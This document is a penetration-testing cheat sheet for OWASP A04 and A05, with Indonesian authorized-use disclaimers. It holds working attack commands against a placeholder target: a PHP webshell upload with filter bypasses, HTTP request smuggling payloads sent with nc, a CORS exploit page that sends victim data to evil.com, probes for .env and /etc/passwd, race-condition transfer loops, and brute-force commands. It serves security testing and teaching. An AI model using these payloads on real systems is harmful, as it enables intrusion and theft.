# 🏗️ INSECURE DESIGN & SECURITY MISCONFIGURATION — Part 10

## OWASP A04:2021 Insecure Design + A05:2021 Security Misconfiguration

> ⚠️ **Hanya untuk penetration testing yang sudah diotorisasi & tujuan pendidikan.**

---

## 📑 Table of Contents

### A04 — Insecure Design
1. [Overview & CWE Map](#1-overview--cwe-map-a04)
2. [Error Message Information Leak](#2-error-message-information-leak)
3. [Credential Storage Flaws](#3-credential-storage-flaws)
4. [File Upload Vulnerabilities](#4-file-upload-vulnerabilities)
5. [HTTP Request Smuggling](#5-http-request-smuggling)
6. [Business Logic Flaws](#6-business-logic-flaws)
7. [Trust Boundary & Client-Side Security](#7-trust-boundary--client-side-security)
8. [Clickjacking (UI Redress)](#8-clickjacking-ui-redress)
9. [Rate Limiting & Anti-Automation](#9-rate-limiting--anti-automation)

### A05 — Security Misconfiguration
10. [Overview & CWE Map](#10-overview--cwe-map-a05)
11. [Default Credentials](#11-default-credentials)
12. [Unnecessary Features & Services](#12-unnecessary-features--services)
13. [HTTP Header Misconfiguration](#13-http-header-misconfiguration)
14. [Cloud Misconfiguration](#14-cloud-misconfiguration)
15. [Server & Framework Hardening](#15-server--framework-hardening)
16. [CORS Misconfiguration](#16-cors-misconfiguration)
17. [TLS/SSL Misconfiguration](#17-tlsssl-misconfiguration)
18. [Automated Misconfiguration Scanning](#18-automated-misconfiguration-scanning)

---

# PART A: INSECURE DESIGN (A04:2021)

# 1. Overview & CWE Map (A04)

| CWE | Name | Risk |
|-----|------|------|
| CWE-209 | Error Message Containing Sensitive Info | Stack traces, DB info |
| CWE-256 | Unprotected Storage of Credentials | Plaintext passwords |
| CWE-257 | Storing Passwords in Recoverable Format | Reversible encryption |
| CWE-266 | Incorrect Privilege Assignment | Over-privileged users |
| CWE-311 | Missing Encryption of Sensitive Data | Unencrypted PII |
| CWE-312 | Cleartext Storage of Sensitive Info | Secrets in plaintext |
| CWE-434 | Unrestricted Upload of Dangerous File | Webshell upload |
| CWE-444 | HTTP Request Smuggling | CL/TE desync |
| CWE-501 | Trust Boundary Violation | Client-side trust |
| CWE-522 | Insufficiently Protected Credentials | Weak password storage |
| CWE-598 | GET Request With Sensitive Query Strings | Creds in URL |
| CWE-602 | Client-Side Enforcement of Server-Side Security | JS-only auth |
| CWE-799 | Improper Control of Interaction Frequency | No rate limit |
| CWE-840 | Business Logic Errors | Workflow bypass |
| CWE-841 | Improper Enforcement of Behavioral Workflow | Step skipping |
| CWE-1021 | Improper Restriction of Rendered UI Layers | Clickjacking |

---

# 2. Error Message Information Leak

```bash
# CWE-209: Generation of Error Message Containing Sensitive Information

# ===== TRIGGER ERROR MESSAGES =====
# SQL error
curl "https://target.com/user?id=1'"
# Expected: SQL error with table/column names

# Stack trace
curl "https://target.com/nonexistent-endpoint"
# Expected: Framework stack trace (Django, Spring, Laravel)

# Path disclosure
curl "https://target.com/%00"
curl "https://target.com/../../../../etc/passwd"
# Expected: Full server path in error

# Debug mode
curl "https://target.com/?debug=true"
curl "https://target.com/?XDEBUG_SESSION_START=1"
# Django: /settings/
# Laravel: APP_DEBUG=true
# Spring: /error endpoint

# ===== COMMON INFO LEAKED =====
# - Database type & version
# - Table names, column names
# - Server filesystem paths
# - Framework version
# - Internal IP addresses
# - Stack traces with source code
# - Connection strings

# ===== NUCLEI SCAN =====
nuclei -u https://target.com -tags error,exposure,disclosure

# ===== FFUF for debug endpoints =====
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/debug-endpoints.txt
# Common: /debug, /trace, /actuator, /elmah.axd, /phpinfo.php
```

---

# 3. Credential Storage Flaws

```bash
# CWE-256/257/312/522: Credential Storage Issues

# ===== FIND EXPOSED CREDENTIALS =====
# Config files
curl https://target.com/.env
curl https://target.com/config.php
curl https://target.com/wp-config.php
curl https://target.com/web.config
curl https://target.com/application.yml
curl https://target.com/appsettings.json
curl https://target.com/.git/config

# Backup files
curl https://target.com/db.sql
curl https://target.com/backup.zip
curl https://target.com/dump.sql

# ===== CHECK PASSWORD STORAGE =====
# Plaintext (CWE-256) — WORST
SELECT username, password FROM users;
# admin : Password123

# Reversible encryption (CWE-257) — BAD
# AES/DES encrypted passwords that can be decrypted

# Weak hash (MD5/SHA1) — BAD
echo -n "password" | md5sum
# 5f4dcc3b5aa765d61d8327deb882cf99
hashcat -m 0 hash.txt wordlist.txt

# Unsalted hash — BAD
# Same password = same hash → rainbow tables work

# GOOD: bcrypt / scrypt / argon2
# $2b$12$LJ3m4ys3Lr/3wOhXH.yUu... (bcrypt)

# ===== CWE-598: Sensitive Data in GET =====
# Check if login uses GET
curl -v "https://target.com/login?user=admin&pass=secret"
# Credentials appear in:
# - Browser history
# - Server logs
# - Proxy logs
# - Referer header
```

---

# 4. File Upload Vulnerabilities

```bash
# CWE-434: Unrestricted Upload of File with Dangerous Type

# ===== STEP 1: Find upload functionality =====
# Profile picture, avatar, document upload, import CSV

# ===== STEP 2: Test basic webshell upload =====
# PHP webshell
echo '<?php system($_GET["cmd"]); ?>' > shell.php
curl -F "file=@shell.php" https://target.com/upload
curl "https://target.com/uploads/shell.php?cmd=id"

# ===== STEP 3: Bypass filters =====

# Extension bypass
shell.php.jpg           # Double extension
shell.php%00.jpg        # Null byte
shell.pHp              # Case variation
shell.php5             # Alternative extension
shell.phtml            # Alternative extension
shell.php.bak          # Backup extension
shell.php::$DATA       # Windows NTFS stream

# Content-Type bypass
# Change Content-Type header to image/jpeg
curl -F "file=@shell.php;type=image/jpeg" https://target.com/upload

# Magic bytes bypass
# Add GIF header before PHP code
printf 'GIF89a\n<?php system($_GET["cmd"]); ?>' > shell.php.gif

# .htaccess upload (Apache)
echo 'AddType application/x-httpd-php .jpg' > .htaccess
# Then upload PHP code as shell.jpg

# SVG with XSS
cat > xss.svg << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.cookie)</script>
</svg>
EOF

# ===== STEP 4: Find upload path =====
# Check response for file path
# Try: /uploads/, /media/, /files/, /static/uploads/
```

---

# 5. HTTP Request Smuggling

```bash
# CWE-444: HTTP Request Smuggling

# ===== CONCEPT =====
# Front-end (reverse proxy) and back-end interpret Content-Length
# vs Transfer-Encoding differently → request boundaries get confused

# ===== CL.TE (Content-Length wins front, Transfer-Encoding wins back) =====
printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED' | nc target.com 80

# ===== TE.CL =====
printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n' | nc target.com 80

# ===== DETECTION =====
# Timing-based:
# Send CL.TE request → if back-end times out waiting = CL.TE vulnerable

# ===== TOOLS =====
# smuggler
python3 smuggler.py -u https://target.com

# Burp Suite
# Extensions: HTTP Request Smuggler (by James Kettle)

# ===== EXPLOIT SCENARIOS =====
# 1. Bypass front-end security (WAF bypass)
# 2. Capture other users' requests
# 3. XSS via smuggled response
# 4. Cache poisoning
```

---

# 6. Business Logic Flaws

```bash
# CWE-840/841: Business Logic Errors

# ===== COMMON BUSINESS LOGIC BUGS =====

# 1. PRICE MANIPULATION
# Change price in hidden field or API
curl -X POST https://target.com/api/checkout \
  -d '{"item":"laptop","price":0.01,"qty":1}'
# Or negative price for refund

# 2. QUANTITY MANIPULATION
curl -X POST https://target.com/api/cart \
  -d '{"item_id":1,"quantity":-1}'
# Negative quantity → refund/credit?

# 3. COUPON/DISCOUNT ABUSE
# Apply coupon multiple times
# Use expired coupons
# Stack incompatible coupons
# Transfer coupons between accounts

# 4. WORKFLOW SKIP
# Skip payment step in checkout
# Step 1: Add to cart (/cart)
# Step 2: Enter address (/address)
# Step 3: Payment (/payment)     ← SKIP THIS
# Step 4: Confirm (/confirm)     ← Go directly here
curl -X POST https://target.com/api/confirm-order

# 5. RACE CONDITION
# Send multiple requests simultaneously
# Double-spend, double-withdraw
for i in $(seq 1 10); do
  curl -X POST https://target.com/api/transfer \
    -d '{"amount":100,"to":"attacker"}' &
done
wait

# 6. REGISTRATION ABUSE
# Register with admin@target.com (case: Admin@target.com)
# Register with admin@target.com  (trailing space)
# Register with admin@target.com%00 (null byte)

# 7. PASSWORD RESET ABUSE
# Reset token reuse
# Reset token for user A works on user B
# Host header manipulation in reset email
curl -X POST https://target.com/forgot-password \
  -H "Host: evil.com" -d "email=victim@target.com"
```

---

# 7. Trust Boundary & Client-Side Security

```bash
# CWE-501/602: Trust Boundary Violation & Client-Side Enforcement

# ===== CLIENT-SIDE ONLY VALIDATION =====
# If validation only in JavaScript → bypass with Burp/curl

# Price check only in JS
# Original: {"price": 99.99} → Burp: {"price": 0.01}

# Role check only in JS
# Frontend hides admin panel → directly access /admin

# ===== CWE-472: External Control of Immutable Parameters =====
# Hidden form fields
<input type="hidden" name="role" value="user">
# Change to: value="admin"

<input type="hidden" name="price" value="99.99">
# Change to: value="0.01"

# ===== CWE-642: External Control of Critical State Data =====
# Cookie manipulation
Cookie: role=user → role=admin
Cookie: discount=0 → discount=100
Cookie: isAdmin=false → isAdmin=true

# ===== TESTING =====
# 1. Intercept ALL requests with Burp
# 2. Modify hidden fields, cookies, headers
# 3. Remove client-side validation (disable JS)
# 4. Access API endpoints directly (skip UI)
```

---

# 8. Clickjacking (UI Redress)

```bash
# CWE-1021: Improper Restriction of Rendered UI Layers

# ===== CHECK VULNERABILITY =====
curl -sI https://target.com | grep -i "x-frame-options\|frame-ancestors"
# No header → VULNERABLE

# ===== TEST =====
cat > clickjack_test.html << 'EOF'
<html>
<head><title>Clickjacking Test</title></head>
<body>
<h1>If you see the target site below, it's VULNERABLE:</h1>
<iframe src="https://target.com" width="800" height="600"></iframe>
</body>
</html>
EOF

# ===== FIX =====
# X-Frame-Options: DENY
# Content-Security-Policy: frame-ancestors 'none'
```

---

# 9. Rate Limiting & Anti-Automation

```bash
# CWE-799: Improper Control of Interaction Frequency

# ===== TEST RATE LIMITING =====
# Login brute force
for i in $(seq 1 100); do
  curl -s -o /dev/null -w "%{http_code}" \
    -d "user=admin&pass=test$i" https://target.com/login
done
# If all return 200 → no rate limiting!

# API abuse
for i in $(seq 1 1000); do
  curl -s https://target.com/api/users/$i
done
# If no 429 → no rate limiting

# ===== COMMON MISSING RATE LIMITS =====
# - Login attempts (brute force)
# - Password reset requests
# - OTP/2FA verification
# - API endpoints
# - Registration
# - File upload
# - SMS sending (OTP flood)
```

---

# PART B: SECURITY MISCONFIGURATION (A05:2021)

# 10. Overview & CWE Map (A05)

```
Top Misconfigurations:
- Default credentials left unchanged
- Unnecessary features enabled (admin panels, debug)
- Missing security headers
- Overly permissive CORS
- Directory listing enabled
- Stack traces in production
- Cloud storage publicly accessible
- Outdated TLS/SSL configuration
```

---

# 11. Default Credentials

```bash
# ===== TEST DEFAULT CREDENTIALS =====

# Common defaults
admin:admin
admin:password
admin:123456
root:root
root:toor
administrator:administrator
test:test
guest:guest

# ===== DATABASE DEFAULTS =====
# MySQL
mysql -u root -p       # default: empty password
# PostgreSQL
psql -U postgres       # default: postgres
# MongoDB
mongo                  # default: no auth
# Redis
redis-cli              # default: no auth
# Elasticsearch
curl http://localhost:9200  # default: no auth

# ===== DEVICE/APPLIANCE DEFAULTS =====
# Router: admin:admin, admin:1234
# Tomcat: tomcat:tomcat, admin:admin
# Jenkins: no default auth (open!)
# Grafana: admin:admin
# phpMyAdmin: root:(empty)
# Kibana: no auth by default

# ===== TOOLS =====
# Hydra (brute force with default creds)
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt target.com ftp

# Nmap default creds
nmap --script http-default-accounts target.com

# Nuclei default login
nuclei -u https://target.com -tags default-login
```

---

# 12. Unnecessary Features & Services

```bash
# ===== FIND EXPOSED ADMIN PANELS =====
ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
# Look for:
# /admin, /manager, /console, /phpmyadmin
# /actuator, /debug, /trace, /metrics
# /elmah.axd, /phpinfo.php, /server-status

# ===== DIRECTORY LISTING =====
curl https://target.com/images/
curl https://target.com/backup/
# If directory contents shown → misconfigured

# ===== DEBUG/DEV ENDPOINTS =====
# Spring Boot Actuator
curl https://target.com/actuator/env      # Environment variables
curl https://target.com/actuator/heapdump  # Memory dump!
curl https://target.com/actuator/mappings  # All endpoints

# Laravel debug
curl https://target.com/_debugbar

# Django debug
# If DEBUG=True → detailed error pages

# PHP info
curl https://target.com/phpinfo.php
curl https://target.com/info.php

# ===== UNNECESSARY HTTP METHODS =====
curl -X OPTIONS https://target.com -i
# If allows PUT, DELETE, TRACE → misconfigured
curl -X TRACE https://target.com -i
# If response echoes back → XST vulnerability
```

---

# 13. HTTP Header Misconfiguration

```bash
# ===== CHECK SECURITY HEADERS =====
curl -sI https://target.com

# REQUIRED HEADERS:
# Strict-Transport-Security: max-age=31536000; includeSubDomains
# X-Content-Type-Options: nosniff
# X-Frame-Options: DENY
# Content-Security-Policy: default-src 'self'
# Referrer-Policy: strict-origin-when-cross-origin
# Permissions-Policy: camera=(), microphone=(), geolocation=()
# X-XSS-Protection: 0  (deprecated, CSP is better)

# ===== TOOLS =====
# securityheaders.com
curl -sI https://target.com | grep -iE "strict|x-frame|x-content|content-security|referrer|permission"

# Nuclei
nuclei -u https://target.com -tags misconfig,header

# shcheck
pip install shcheck
shcheck.py https://target.com
```

---

# 14. Cloud Misconfiguration

```bash
# ===== AWS S3 BUCKET =====
# Check public access
aws s3 ls s3://BUCKET_NAME --no-sign-request
aws s3 cp s3://BUCKET_NAME/secret.txt . --no-sign-request

# List all public objects
aws s3api list-objects --bucket BUCKET_NAME --no-sign-request

# Tools
# S3Scanner
pip install s3scanner
s3scanner scan --bucket BUCKET_NAME

# bucket_finder
ruby bucket_finder.rb wordlist.txt

# ===== AZURE BLOB =====
curl "https://ACCOUNT.blob.core.windows.net/CONTAINER?restype=container&comp=list"

# ===== GCP BUCKET =====
curl "https://storage.googleapis.com/BUCKET_NAME"
gsutil ls gs://BUCKET_NAME

# ===== COMMON CLOUD MISCONFIGS =====
# - S3 bucket publicly readable/writable
# - IAM roles overly permissive
# - Security groups allowing 0.0.0.0/0
# - No MFA on root account
# - CloudTrail/logging disabled
# - Unencrypted EBS volumes
# - Public RDS instances
# - Lambda with excessive permissions

# ===== TOOLS =====
# ScoutSuite (multi-cloud auditor)
pip install scoutsuite
scout aws

# Prowler (AWS security)
pip install prowler
prowler aws

# CloudSploit
git clone https://github.com/aquasecurity/cloudsploit.git
```

---

# 15. Server & Framework Hardening

```bash
# ===== APACHE =====
# Check: ServerTokens, ServerSignature
curl -sI https://target.com | grep Server
# "Server: Apache/2.4.41 (Ubuntu)" → leaking version!
# Fix: ServerTokens Prod, ServerSignature Off

# ===== NGINX =====
curl -sI https://target.com | grep Server
# "Server: nginx/1.18.0" → leaking version!
# Fix: server_tokens off;

# ===== PHP =====
curl -sI https://target.com | grep X-Powered-By
# "X-Powered-By: PHP/7.4" → leaking version!
# Fix: expose_php = Off

# ===== WORDPRESS =====
curl https://target.com/readme.html
curl https://target.com/wp-login.php
# Check: xmlrpc.php enabled? user enumeration?
wpscan --url https://target.com --enumerate u,vp,vt

# ===== DJANGO =====
# Check DEBUG mode
curl https://target.com/nonexistent-url
# If detailed error → DEBUG=True in production!

# ===== NODE.JS / EXPRESS =====
curl -sI https://target.com | grep X-Powered-By
# "X-Powered-By: Express" → remove with helmet
# app.disable('x-powered-by')
```

---

# 16. CORS Misconfiguration

```bash
# ===== TEST CORS =====
# Reflect Origin
curl -sI https://target.com -H "Origin: https://evil.com" | grep -i "access-control"
# If Access-Control-Allow-Origin: https://evil.com → VULNERABLE!

# Null origin
curl -sI https://target.com -H "Origin: null" | grep -i "access-control"
# If allows null → VULNERABLE (sandboxed iframe exploit)

# Wildcard with credentials
# Access-Control-Allow-Origin: *
# Access-Control-Allow-Credentials: true
# → Browser blocks this, but misconfigured servers may try

# ===== EXPLOIT CORS =====
cat > cors_exploit.html << 'EOF'
<script>
fetch('https://target.com/api/user/profile', {credentials: 'include'})
  .then(r => r.json())
  .then(d => fetch('https://evil.com/steal?data=' + JSON.stringify(d)));
</script>
EOF
# Host on evil.com → victim visits → data stolen

# ===== TOOLS =====
# CORScanner
python cors_scan.py -u https://target.com
# Nuclei
nuclei -u https://target.com -tags cors
```

---

# 17. TLS/SSL Misconfiguration

```bash
# ===== TEST SSL/TLS =====
# SSLScan
sslscan target.com

# testssl.sh
./testssl.sh https://target.com

# Nmap SSL
nmap --script ssl-enum-ciphers -p 443 target.com

# ===== COMMON ISSUES =====
# - SSLv3 enabled (POODLE)
# - TLS 1.0/1.1 enabled (deprecated)
# - Weak ciphers (RC4, DES, 3DES)
# - Missing HSTS header
# - Self-signed certificate
# - Expired certificate
# - Wildcard certificate misuse
# - Mixed content (HTTP on HTTPS page)

# ===== ONLINE TOOLS =====
# https://www.ssllabs.com/ssltest/
# https://observatory.mozilla.org/
```

---

# 18. Automated Misconfiguration Scanning

```bash
# ===== NUCLEI (all-in-one) =====
nuclei -u https://target.com -tags misconfig -o misconfig_results.txt
nuclei -u https://target.com -tags exposure
nuclei -u https://target.com -tags default-login
nuclei -u https://target.com -tags tech

# ===== NIKTO =====
nikto -h https://target.com

# ===== FULL PIPELINE =====
# 1. Scan headers
shcheck.py https://target.com

# 2. Find admin panels
ffuf -u https://target.com/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -fc 404

# 3. Default creds check
nuclei -u https://target.com -tags default-login

# 4. SSL check
sslscan target.com

# 5. Cloud misconfig
scout aws  # or: prowler aws

# 6. CORS check
nuclei -u https://target.com -tags cors

# 7. Full nuclei sweep
nuclei -u https://target.com -severity critical,high,medium
```

---


Whats next ? https://github.com/RajChowdhury240/OSCP-CheatSheet/blob/main/Linux%20-%20Privilege%20Escalation.md

> ⚠️ **DISCLAIMER**: Semua tools dan teknik hanya untuk **ethical hacking**, **pentesting yang sudah diotorisasi**, dan **edukasi**.
